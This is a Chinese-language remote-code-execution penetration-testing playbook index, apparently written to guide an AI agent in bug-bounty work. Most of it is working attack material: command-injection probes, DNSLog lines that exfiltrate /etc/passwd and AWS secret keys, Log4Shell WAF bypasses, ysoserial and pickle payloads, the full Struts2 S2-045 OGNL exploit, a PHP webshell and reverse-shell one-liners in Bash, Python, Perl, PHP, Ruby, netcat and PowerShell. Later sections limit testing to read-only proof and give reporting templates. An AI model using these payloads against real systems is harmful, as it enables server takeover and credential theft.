# 远程代码执行 (RCE) — 决策索引

> 视角:黑盒,单包打穿是首选;带外回显是无回显场景的救命稻草。
> 本文件是 RCE playbook 的**入口路由 + 通用execution-framework**。Phase 4 测 RCE 时先读本文件建立认知,**再 Read 对应子文件取 payload**——不要凭记忆生成。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 响应/URL 含框架指纹(Log4j/Spring/Fastjson/Struts2/WebLogic/ThinkPHP/Laravel/Shiro/JBoss/Tomcat/Django/Flask) | `10-framework.md` |
| 网络诊断(ping/nslookup) / 文件功能(解压/转换) / 用户输入拼接进系统命令 | `11-command-injection.md` |
| Cookie/ViewState 含 `rO0AB` 二进制(Java魔术字节 `aced0005`) 或 `O:` 开头(PHP) / pickle / yaml.load / Marshal.load | `12-deserialization.md`(含Gadget链优先级树 / JNDI注入 / JRMP / 内存马) |
| JSON报错含 `fasterxml.jackson` / 请求含 `@type` / Jackson enableDefaultTyping | `10-framework.md` §Jackson |
| 上传点 + 解析配合(Apache 多后缀 / Nginx fix_pathinfo) / LFI/RFI / 日志投毒 / 图片马 / .htaccess | `13-file-rce-chain.md` |
| 模板表达式 `{{7*7}}` / `${7*7}` / `#{7*7}` / `%{7*7}` 被求值 | `14-ssti.md` |
| XML 解析点 / SOAP / SVG / DOCX/XLSX 上传 | `15-xxe.md` |
| 自定义依赖 / 私有 npm registry / CI/CD 配置 | `16-supply-chain.md` |
| Node.js JSON merge / `Object.assign` / lodash `_.merge` 用户输入 | `17-prototype-pollution.md` |

---

## 1. 一句话说清

RCE = 在目标服务器上执行任意命令。
渗透价值:**所有漏洞类型中最高**,未授权 RCE = 直接服务器控制权。
两条路:(a) 命令注入(拼接系统命令);(b) 反序列化 / 表达式注入(运行时 evaluate)。

---

## 2. 高频入口点(统计 + 类别)

### 2.1 框架 / 中间件类(指纹漏洞)

| 类型 | 案例数 | 入口指纹 |
|------|------|---------|
| Struts2 | 23 | URL 含 `.action`、`.do`,响应 `Server: Apache-Coyote` |
| WebLogic | 5 | 7001 端口 + `/console/` |
| JBoss | 9 | `/jmx-console/`、`/invoker/` |
| Tomcat | 9 | 8080 + `/manager/html` |
| Spring | 4 | `Server: spring`、`X-Application-Context` |
| ElasticSearch | 8 | 9200 + Lucene 1.x |
| Fastjson | - | 响应 / 错误页含 `com.alibaba.fastjson` |
| Log4j | - | 处处可能(任何日志记录的输入点) |
| Redis | 4 | 6379(详见 unauth-access) |
| Jenkins | - | 8080 + `/manage`、`/script` |
| Zabbix | 2 | 80 + `Zabbix SIA` |

### 2.2 命令注入入口(功能特征)

| 功能 | 案例数 | 参数 |
|------|------|------|
| 网络诊断(ping / nslookup / traceroute) | 13 | `host`、`ip`、`target` |
| 文件操作(解压 / 转换) | 34 | `filename`、`path` |
| 图片处理 | 12 | `image`、`file` |
| URL 抓取 | 12 | `url`、`callback` |
| DNS 查询 | 8 | `domain` |
| 备份 / 任务调度 | - | `cmd`、`task`、`job` |

### 2.3 反序列化入口

```
# Java
Cookie / Authorization 含 base64 二进制(rO0AB 开头 = Java 序列化)
ViewState(ASP.NET)
__viewstate / __eventvalidation
sessionid 含 Java 序列化数据

# PHP
unserialize() 接受用户输入(O:8: 开头)
phar:// 协议触发自动反序列化

# Python
pickle.loads() 接受用户输入
yaml.load() 不安全调用

# Ruby
Marshal.load() 接受 cookie / 参数
```

---

## 3. 探测手法

### 3.1 命令注入探针表

```bash
# 拼接符
target=127.0.0.1; id
target=127.0.0.1| id
target=127.0.0.1|| id
target=127.0.0.1 && id
target=127.0.0.1 & id
target=127.0.0.1 `id`
target=127.0.0.1 $(id)
target=127.0.0.1%0aid           # URL 换行
target=127.0.0.1%0d%0aid

# 时间盲(无回显时)
target=127.0.0.1; sleep 5
target=127.0.0.1 && ping -c 5 127.0.0.1
target=127.0.0.1 || sleep 5

# DNSLog 外带
target=127.0.0.1;ping -c 1 `whoami`.xxx.dnslog.cn
target=127.0.0.1;curl `cat /etc/passwd|base64|tr -d '\n'`.xxx.dnslog.cn

# Windows
target=127.0.0.1 & whoami
target=127.0.0.1 | whoami
```

### 3.2 模板注入 / 表达式注入探针

| 技术 | 探针 | 命中后 |
|------|------|------|
| SSTI(Jinja2) | `{{7*7}}` → 49 | `{{config}}`、`{{request.application.__globals__}}` |
| SSTI(Twig) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}` |
| SSTI(Freemarker) | `${7*7}` → 49 | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| SSTI(Velocity) | `#set($x=7*7)$x` → 49 | Runtime.exec |
| SSTI(Smarty) | `{$smarty.version}` → 显示版本 | `{system('id')}` |
| SpEL(Spring) | `#{7*7}` 或 `${7*7}` | `T(java.lang.Runtime).getRuntime().exec("id")` |
| OGNL(Struts2) | `%{7*7}` | 见 Struts2 表达式 |
| EL(JSP) | `${7*7}` | EL injection 链 |
| JEXL | `7*7` 在 JEXL 上下文 | - |

### 3.3 Log4Shell 通用探针(每个输入点都试)

```
${jndi:ldap://${hostName}.${env:USER}.xxx.dnslog.cn/a}
${jndi:ldap://xxx.dnslog.cn/a}
${jndi:dns://xxx.dnslog.cn/a}    # 不需出网 LDAP,DNS 即可
${jndi:rmi://xxx.dnslog.cn:1099/a}

# 绕过 WAF
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.dnslog.cn/a}
${${lower:j}ndi:${lower:l}dap://x.dnslog.cn/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.dnslog.cn/a}

# 带数据外带
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.x.dnslog.cn/a}
${jndi:ldap://${sys:java.version}.x.dnslog.cn/a}
${jndi:ldap://${env:USER}.x.dnslog.cn/a}
```

**插入点**:每一个**会被记日志**的字段都打:
- `User-Agent`
- `Referer`
- `X-Forwarded-For`
- `X-Api-Version`
- `Cookie`
- 用户名 / 邮箱字段
- 上传文件名
- chat / comment / search 关键词

### 3.4 反序列化探针

```bash
# Java(ysoserial)
java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn"
# 把生成的 base64 放到 Cookie / ViewState / Authorization

# 验证 Java 序列化
echo "input" | base64 -d | xxd | head -1
# rO0AB 开头 = Java serialized

# 通用 gadget chain(按依赖判断)
ysoserial CommonsCollections1
ysoserial CommonsCollections5
ysoserial CommonsBeanutils1
ysoserial Hibernate1
ysoserial Spring1
ysoserial Jdk7u21        # JDK 自带
```

```bash
# .NET ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"
```

```python
# Python pickle
import pickle, os, base64
class Exp:
    def __reduce__(self):
        return (os.system, ("curl xxx.dnslog.cn",))
print(base64.b64encode(pickle.dumps(Exp())))
```

### 3.5 Fastjson 探针

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/a","autoCommit":true}
```

### 3.6 Spring4Shell 探针

```
POST /vulnerable
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
```

200 + 不报错 = 可能存在;进一步配合 Tomcat AccessLogValve 写 webshell。

### 3.7 OGNL(Struts2)探针

```
S2-045
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data
```

### 3.8 上传 + 解析配合(Webshell)

```
1. 上传图片马(GIF89a + <?php @eval($_POST[c]);?>)→ shell.jpg
2. 利用 Apache 多后缀 / Nginx fix_pathinfo / IIS 解析触发
   - Apache: shell.php.x → 当 PHP 解析
   - Nginx:  shell.jpg/.php → PHP-CGI 处理
   - IIS6:   shell.asp;.jpg → 当 ASP
3. 访问触发 → RCE
```

详见 `references/playbooks/file-upload/00-index.md` 与本目录 `13-file-rce-chain.md`。

---

## 4. Bypass 矩阵

完整内容见 `references/strategy/02-bypass-toolkit.md` 第 4 章。**关键速记**:

| 拦 | 绕 |
|---|---|
| 空格 | `${IFS}`、`${IFS}$9`、`%09`、`{cat,/etc/passwd}`、`<` |
| `cat` 关键字 | `c'a't`、`c\at`、`tac`、`/bin/c?t`、`/???/??t` |
| `;` `\|` | `%0a`、`%0d`、`&&`、`\|\|`、`` ` `` |
| 命令字过滤 | base64:`echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` |
| 出网拦截 | DNS 外带(53 几乎不拦) |
| 关键字 `jndi` | `${${lower:j}ndi:...}`、`${${::-j}ndi:...}` |
| 长度限制 | 短链 / shorthand 域名 / `id\|nc x.cc 80` |

---

## 5. 利用提权 / 横向

### 5.1 反弹 shell

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Windows PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 5.2 SRC 测试**不要**反弹 shell

仅做以下"无副作用"证明:

```bash
# 验证执行
id
whoami
hostname
uname -a
cat /etc/hostname

# 外带证明
curl https://attacker.cc/?d=$(id|base64)
ping -c 1 $(whoami).xxx.dnslog.cn

# 读取证明(避免敏感数据)
ls /
cat /etc/passwd | head -3
cat /etc/issue
```

**禁止**:`/etc/shadow`、生产数据库连接、写文件、删文件、留 shell。

### 5.3 价值升级链

```
命令注入 (无 root)
  → 读 /etc/passwd, /proc/self/environ
  → 找 ssh key, .bash_history
  → 提权(看是否 root,看 sudo -l,看 SUID)
  → 横向(看 /etc/hosts, ~/.aws/credentials, ~/.docker/config.json)

→ 渗透报告时停在"id 输出 / hostname 输出"即可,不要做提权 / 横向
  除非靶方明确允许"内网测试"
```

---

## 6. 真实案例指纹

### 6.1 Log4Shell (CVE-2021-44228)

| 项目 | 值 |
|------|---|
| 影响版本 | Log4j 2.0 – 2.14.1 |
| 修复版本 | 2.17.0+(2.15 / 2.16 仍有绕过) |
| 黑盒指纹 | 任何被记录的输入点都可能触发 |
| 探针 | `${jndi:dns://x.dnslog.cn/a}`,DNSLog 收到 = 命中 |
| CVSS | 10.0 Critical |

### 6.2 Spring4Shell (CVE-2022-22965)

| 项目 | 值 |
|------|---|
| 触发条件 | JDK 9+ + Spring 5.3.0–5.3.17 / 5.2.0–5.2.19 + WAR 部署 |
| 黑盒指纹 | `class.module.classLoader.resources.context.parent.pipeline.first.pattern=` 不报错 |
| CVSS | 9.8 Critical |

### 6.3 Fastjson 反序列化

| CVE | 版本 | 关键 |
|-----|------|------|
| CVE-2017-18349 | < 1.2.25 | `@type` 直接利用 |
| CVE-2019-12384 | 1.2.25–1.2.47 | 缓存绕过 |
| - | 1.2.48–1.2.67 | 各种 gadget |
| - | 1.2.68–1.2.80 | expectClass 绕过 |
| - | < 1.2.83 | 仍有风险 |

黑盒指纹:响应 / 错误页提到 `fastjson`、`com.alibaba.fastjson`,或 POST JSON 后报特定异常。

探针:
```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
```
DNSLog 收到 = 至少 Fastjson 解析了 `@type`,进一步用 1.2.47 绕过链:

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}}
```

### 6.4 Struts2 系列

| CVE | 版本 | 触发 |
|-----|------|------|
| S2-001 | 2.0.0–2.0.8 | OGNL 直接 |
| S2-005 | 2.0.0–2.1.8.1 | `('#'+a)(...)`  |
| S2-009 | 2.1.0–2.3.1.1 | 修复绕过 |
| S2-013 | 2.0.0–2.3.14 | `redirect:`、`action:` |
| S2-016 | 2.0.0–2.3.15 | redirect/action 命令 |
| S2-019 | 2.0.0–2.3.15.1 | 动态方法调用 |
| S2-032 | 2.3.20–2.3.28 | 同上 |
| **S2-045** | 2.3.5–2.3.31 | `Content-Type: %{...}.multipart/form-data` |
| S2-046 | 2.3.5–2.3.31 | Content-Disposition |
| S2-048 | 2.3.x + Struts1 | Struts1 插件 |
| S2-052 | 2.1.2–2.3.33 | REST 插件 XML 反序列化 |
| S2-053 | 2.0.1–2.3.33 | Freemarker |
| S2-057 | 2.0.4–2.3.34 | namespace |

通用探针:
```
POST / HTTP/1.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```
响应 Header 出现 `X-Test: 15129` = 命中。

### 6.5 ImageMagick "ImageTragick" (CVE-2016-3714)

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/x/x 0>&1")'
pop graphic-context
```
影响:上传 .mvg / 含 EXIF SVG 触发 ImageMagick 处理时。

### 6.6 FFmpeg HLS SSRF / 文件读

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

### 6.7 ElasticSearch Groovy (CVE-2014-3120 / 2015-1427)

```json
POST /_search
{"script_fields":{"e":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

### 6.8 ThinkPHP

| 版本 | CVE | 触发 |
|------|-----|------|
| 5.0.0–5.0.23 | CVE-2018-20062 | `?s=captcha` + `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id` |
| 5.1.x | - | 反序列化 |
| 6.0.x | CVE-2022-38627 | 多语言 RCE |

### 6.9 Jenkins Script Console

```
访问 http://target:8080/script
(如果未授权或弱口令)
> def cmd = "id"
> println cmd.execute().text
```

### 6.10 WebLogic 反序列化

| CVE | 触发 |
|-----|-----|
| CVE-2017-10271 | `/wls-wsat/CoordinatorPortType` SOAP XMLDecoder |
| CVE-2018-2628 | T3 反序列化 |
| CVE-2019-2725 | `/_async/AsyncResponseService` |
| CVE-2020-2551 | IIOP |
| CVE-2020-14882 | 后台 RCE(bypass admin) |

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. **完整 HTTP 请求 + 响应**
2. **执行证据**:`id` 输出截图、DNSLog 收到记录的截图(含时间、域名、源 IP)
3. **影响断言**:能拿到什么权限(user / root),不要做实际提权
4. **CVSS vector**

### 7.2 DNSLog 证据样式

```
DNSLog 平台:dnslog.cn
监听域名:abcdef.xxx.dnslog.cn

记录:
  Time                     Source IP        Subdomain
  2025-05-09 14:23:11 UTC  3.x.x.x          test.abcdef.xxx.dnslog.cn

源 IP 3.x.x.x 经反查为 target.com 的出口 IP(AWS us-west-2)。
完整日志见附件 dnslog_screenshot.png。
```

### 7.3 命令输出样式

```
请求:
  POST /api/util/ping HTTP/1.1
  ...
  body: {"host":"127.0.0.1; id"}

响应(关键片段):
  PING 127.0.0.1 ...
  ...
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 7.4 CVSS

```
未授权 RCE     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical
认证后 RCE     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8 High
RCE 需用户交互 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 8.8 High
```

### 7.5 影响段示例

```
通过 /api/util/ping 接口的 host 参数,攻击者可注入任意 OS 命令并由 www-data
身份执行。攻击者可:
1. 读取应用配置(/etc/issue、application.properties);
2. 横向至内网(参考已暴露的 ip route、/etc/hosts 信息);
3. 在不修复的情况下,可通过 SUID 二进制 / sudo 提权至 root。

测试证据:
- 单包打穿(无需登录)
- 命令 `id` 输出 uid=33(www-data)
- DNSLog 收到带外回显(附件 1)
- 复现 5/5 次
```

---

## 相关 MCP 工具

实战中可调用 jshookmcp 完成自动化。**默认 `search` profile 未预加载工具,调用前先用 `mcp__jshook__activate_tools <工具名>` 激活**(详见 `references/tools/mcp-jshook.md` §推荐 profile)。

| 工具 | 域 | 调用时机 |
|---|---|---|
| `mcp__jshook__wasm_disassemble` + `mcp__jshook__wasm_decompile` | wasm | 业务侧 WASM 模块逆向 / 反序列化 sink 定位 |
| `mcp__jshook__antidebug_bypass` | antidebug | 目标主动反调试时先绕过再下断 |
| `mcp__jshook__generate_hooks` + `mcp__jshook__frida_run_script` | binary-instrument | Frida hook 验证 RCE 落点(只读命令) |
| `mcp__jshook__electron_ipc_sniff` | platform | Electron 桌面端 IPC 漏洞观察 |
| `mcp__jshook__mojo_monitor` + `mcp__jshook__syscall_start_monitor` | mojo-ipc / syscall-hook | Chromium 内核漏洞研究 / 系统调用留证 |

完整映射:`references/tools/mcp-jshook.md`

---

## 8. 不要做的事

- **禁**:在目标上反弹 shell。**只跑只读命令**:`id`、`whoami`、`uname -a`、`cat /etc/issue`。
- **禁**:写入文件 / 留 webshell / 修改任何文件。
- **禁**:尝试本地提权(sudo、SUID 利用、kernel exploit)。
- **禁**:访问 `/etc/shadow`、SSH 私钥、生产数据库凭据。
- **禁**:Log4Shell 之类用 LDAP gadget 实际加载远程类——只用 DNS 外带证明触发即可。
- **禁**:用 ysoserial 实际发起 reverse shell;用 `URLDNS` gadget 仅做出网证明。
- **限速**:单测试 1–2 rps,避免触发风控。
- **报告中**完整的命令输出可以贴,但**主机名 / 内网 IP / 用户名要脱敏**到看不出具体业务。

---

## H1 真实案例

_共 385 份 HackerOne 已披露 High/Critical 报告命中本类,按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题(点击看原报告) | 摘要 |
|---|--:|---|---|---|
| Critical | 20160 usd | X / xAI | [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295) | Hi, we(Orange Tsai and Meh Chang) are the security research team from DEVCORE |
| Critical | 25000 usd | Snapchat | [Exposed Kubernetes API - RCE/Exposed Creds](https://hackerone.com/reports/455645) | Exposed Kubernetes API - RCE/Exposed Creds |
| Critical | 30000 usd | PayPal | [RCE via npm misconfig -- installing internal libraries from the public registry](https://hackerone.com/reports/925585) | RCE via npm misconfig -- installing internal libraries from the public registry |
| Critical | 15000 usd | PlayStation | [Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application](https://hackerone.com/reports/873614) | Websites Can Run Arbitrary Code on Machines Running the 'PlayStation Now' Application |
| Critical | 12000 usd | GitLab | [Git flag injection - local file overwrite to remote code execution](https://hackerone.com/reports/658013) | Summary The `wiki_blobs` scope of the Search API can be provided with an arbitrary `ref` parameter, allowing for additional fla… |
| Critical | — | Semrush | [Remote Code Execution on www.semrush.com/my_reports on Logo upload](https://hackerone.com/reports/403417) | The Logo upload in the report constructor at: https://www.semrush.com/my_reports/constructor {F340480} is passed through a not … |
| Critical | 33510 usd | GitLab | [Remote Command Execution via Github import](https://hackerone.com/reports/1679624) | Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#… |
| Critical | 20000 usd | GitLab | [RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542) | Summary When uploading image files, GitLab Workhorse passes any files with the extensions jpg/jpeg/tiff through to ExifTool to … |
| Critical | 33510 usd | GitLab | [RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)](https://hackerone.com/reports/1609965) | Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/… |
| Critical | — | Starbucks | [Webshell via File Upload on ecjobs.starbucks.com.cn](https://hackerone.com/reports/506646) | Summary:** OS Command Injection which can let the attacker who get more important information of the server,such as disclosures… |
| Critical | 12000 usd | GitLab | [Local files could be overwritten in GitLab, leading to remote command execution](https://hackerone.com/reports/587854) | Summary Arbitrary file overwrite A new feature (download a directory of a repository) in GitLab 11.11 introduced some changes i… |
| Critical | 20000 usd | GitLab | [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425) | Summary When rendering wiki content with certain extensions such as `.rmd`, `render_wiki_content` will call `other_markup_unsaf… |

**命中本类的 weakness 分布:**

- Code Injection:138 条
- Command Injection - Generic:101 条
- OS Command Injection:43 条
- Deserialization of Untrusted Data:33 条
- Uncategorized → 手工归类:27 条
- XML External Entities (XXE):22 条
- Remote File Inclusion:5 条
- Resource Injection:4 条
- Type Confusion:2 条
- Use of Inherently Dangerous Function:2 条
- ASI05: Unexpected Code Execution (RCE):1 条
- File Content Injection:1 条
- Inclusion of Functionality from Untrusted Control Sphere:1 条
- Leftover Debug Code (Backdoor):1 条
- Download of Code Without Integrity Check:1 条
- Exposed Dangerous Method or Function:1 条
- XML Entity Expansion:1 条
- Embedded Malicious Code:1 条

---

完整 Payload 库见同级子文件(`10-framework.md` 等)。
